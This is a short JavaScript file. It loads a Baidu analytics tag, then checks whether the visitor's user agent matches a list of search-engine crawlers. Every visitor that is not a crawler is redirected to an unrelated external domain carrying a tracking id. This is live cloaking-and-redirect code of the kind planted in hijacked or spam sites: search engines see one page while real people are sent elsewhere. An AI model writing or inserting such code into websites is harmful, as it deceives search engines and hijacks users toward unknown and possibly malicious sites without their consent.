var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b4126daaae1dc3ff710787203aaf41ad";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var userAgent = navigator.userAgent;
var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];

var isSpider = spiderList.some(function(spider) {
    return userAgent.includes(spider);
});

if (!isSpider) {
    window.location.href = "https://www.ppqqzkn.com?id=395312789";
}
